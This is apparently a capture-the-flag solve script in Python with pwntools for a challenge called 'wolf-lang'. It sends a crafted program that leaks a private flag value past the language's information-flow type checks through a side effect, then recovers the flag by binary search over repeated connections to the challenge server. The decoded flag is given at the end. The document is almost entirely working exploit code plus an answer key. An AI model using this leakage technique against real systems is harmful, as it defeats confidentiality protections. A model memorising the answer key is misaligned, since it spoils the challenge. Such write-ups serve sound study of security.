#!/usr/bin/env python2
from pwn import *
from Cryptodome.Util.number import *
code = """
let val = ref 0 in
let f = flag in
let trueFunc = fn(x:private int) => val := 1;( 1 :> private int) in
let falseFunc = fn(x:private int) => val := 0;( 1 :> private int) in
let doNotOutput = if (flag > %d) = true
	then (trueFunc :> private (private int -> private int))(1 :> private int)
	else (falseFunc :> private (private int -> private int))(1 :> private int) in
val
"""
low = 1
high = 2**512
while low != high:
	mid = (low+high)//2
	#r = process(["./wolf-lang"])
	r = remote('wolf.chal.pwning.xxx',4856)
	r.send(code%mid+"\n")
	r.shutdown("send")
	response = r.recvrepeat()
	if "1" in response:
		low = mid + 1
	else:
		high = mid
	r.close()
print long_to_bytes(low)
#155924442406427540021549874283619595368276919852803618371260341956066739655743528771965
#PCTF{$h0u1d_h4v3_f0rma11y_v3r1fi3d!}